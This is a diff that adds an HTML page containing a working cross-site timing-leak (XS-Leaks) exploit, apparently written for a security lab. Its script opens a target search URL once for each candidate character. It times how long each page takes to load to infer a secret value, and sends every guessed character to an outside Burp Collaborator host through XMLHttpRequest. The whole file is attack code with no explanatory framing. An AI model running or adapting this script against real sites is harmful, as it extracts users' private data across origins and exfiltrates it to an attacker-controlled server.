@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  </head>
+  <body>
+    <ul id="secrets"></ul>
+
+<script>
+
+    function sendKey(k)
+    {
+        console.log("sendKey:"+k)
+        try {
+            x = new XMLHttpRequest();
+            x.open("GET","http://qqkxpek9c8g1z17v3kas595rqiw8kx.burpcollaborator.net?key="+k, false);
+            x.send();
+        } catch(e) {
+                console.log("BB"+e);
+        }
+    };
+    
+    var chars="0123456789-abcdef";
+
+    function timeLoad(url, key, i)
+    {
+        var win = window.open(url+key+chars.charAt(i));
+        var start = performance.now();
+        var time = 0;
+        function measure(){
+            try{
+                // If the page has loaded, then it will be on a different origin
+                // so `win.origin` will throw an exception
+                win.origin;
+                // If the window is still same-origin, immediately repeat the loop but
+                // without blocking the event loop
+                setTimeout(measure, 0);
+            }catch(e){
+                // Once the window has loaded, calculate the time difference
+                time = performance.now() - start;
+                win.close();
+                console.log('It took %d ms to load the window', time);
+                if (time > 3300) {
+                    key += chars.charAt(i)
+                    sendKey("rt:"+time+" INT:"+key)
+                    if (key.length < 3) {
+                        console.log("nextkey")
+                        sendKey("rt:"+time+" INT:"+key)
+                        timeLoad(url, key, 0)
+                    }
+                } else {
+                    if (i+1<chars.length) {
+                        console.log("nextchar")
+                        timeLoad(url, key, i+1)
+                    }
+                }
+            }
+        }
+        // Initiate the loop that breaks when the window switches origins
+        measure();
+    }
+
+    sendKey("Started")
+    timeLoad("http://ptl-ff8dcea2-d4247c35.libcurl.so/search?search=%5e", "", 0)
+
+</script>
+  </body>
+</html>
